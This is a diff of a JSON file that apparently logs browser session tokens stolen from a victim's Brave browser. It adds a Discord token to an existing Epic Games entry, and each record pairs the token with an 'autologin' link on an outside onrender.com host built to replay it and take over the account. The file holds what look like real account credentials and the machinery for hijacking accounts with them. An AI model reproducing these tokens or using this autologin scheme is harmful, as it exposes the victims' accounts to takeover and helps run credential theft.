@@ -680,6 +680,12 @@
             "token": "[Brave - EPICGAMES Link/Session]: https://store.epicgames.com/site/account/personal?productName=egs",
             "link": "https://threesrh-system-data.onrender.com/autologin?platform=epic&token=%5BBrave%20-%20EPICGAMES%20Link%2FSession%5D%3A%20https%3A%2F%2Fstore.epicgames.com%2Fsite%2Faccount%2Fpersonal%3FproductName%3Degs",
             "time": 1789435269
+        },
+        {
+            "platform": "discord",
+            "token": "[Brave Browser Discord Token]: UxMDA5ODc2MDM5NzYyMzQ1MA.G24384.hBGn5eBDuNCeUMAK1YRCCpYDRmTUiuR4aFz8-w",
+            "link": "https://threesrh-system-data.onrender.com/autologin?platform=discord&token=%5BBrave%20Browser%20Discord%20Token%5D%3A%20UxMDA5ODc2MDM5NzYyMzQ1MA.G24384.hBGn5eBDuNCeUMAK1YRCCpYDRmTUiuR4aFz8-w",
+            "time": 1789435828
         }
     ]
 }
